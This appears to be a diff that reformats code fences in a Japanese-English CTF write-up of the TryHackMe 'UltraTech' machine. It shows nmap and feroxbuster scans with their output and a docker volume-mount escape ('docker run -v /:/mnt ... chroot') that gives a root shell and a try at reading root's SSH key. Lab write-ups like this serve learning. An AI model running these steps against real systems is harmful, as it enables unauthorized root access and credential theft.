@@ -33,14 +33,10 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -sV -sT -sC $ip
-```
-
-```
 ┌──(n0z0㉿Smile)-[~]
 └─$ nmap -sV -sT -sC $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 20:39 JST
@@ -78,7 +74,7 @@ https://marcorei7.wordpress.com/2020/08/13/028-ultratech/
 
 初手探索
 
-```
+```bash
 ┌──(n0z0㉿Smile)-[~]
 └─$ nmap -sV -sT -sC $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 20:39 JST
@@ -104,7 +100,7 @@ Nmap done: 1 IP address (1 host up) scanned in 57.19 seconds
 
 ポートが少ない気がするから全ポート探索もする
 
-```
+```bash
 ┌──(n0z0㉿Smile)-[~]
 └─$ nmap -p- -sC -sV -T4 $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 20:39 JST
@@ -246,9 +242,6 @@ feroxbusterが早くて便利そう。
 
 ```
 feroxbuster -u http://$ip:31331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,html,txt -r --timeout 3 --no-state -s 200,301 -e -E
-```
-
-```
 ┌──(n0z0㉿LAPTOP-P490FVC2)-[~/work/thm/UltraTech]
 └─$ feroxbuster -u http://$ip:31331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,html,txt -r --timeout 3 --no-state -s 200,301 -e -E
 
@@ -456,7 +449,7 @@ docker run -v /:/mnt --rm -it bash chroot /mnt sh
 
 秘密鍵を回答する
 
-```
+```bash
 r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
 uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
 #
@@ -465,10 +458,8 @@ cat: /root.ssh/id_rsa: No such file or directory
 [REDACTED_PRIVATE_KEY_HEADER]
 [REDACTED_PRIVATE_KEY_MATERIAL]
 At this point, we execute the command to turn enumeration findings into a practical foothold. The goal is to obtain either code execution, reusable credentials, or a stable interactive shell. Relevant options are preserved so the step can be repeated exactly during verification.
-```bash
-cat: /root.ssh/id_rsa: No such file or directory
 ```
-```bash
+cat: /root.ssh/id_rsa: No such file or directory
 
 ### id
 
@@ -484,7 +475,6 @@ cat: /root.ssh/id_rsa: No such file or directory
 
 [REDACTED_PRIVATE_KEY_HEADER]
 [REDACTED_PRIVATE_KEY_MATERIAL]
-```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
@@ -497,7 +487,7 @@ Initial access succeeds when enumeration findings are turned into a practical ex
 
 During the privilege escalation phase, we will prioritize checking for misconfigurations such as `sudo -l` / SUID / service settings / token privilege. By starting this check immediately after acquiring a low-privileged shell, you can reduce the chance of getting stuck.
 
-```bash
+```
 r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
 ```
 
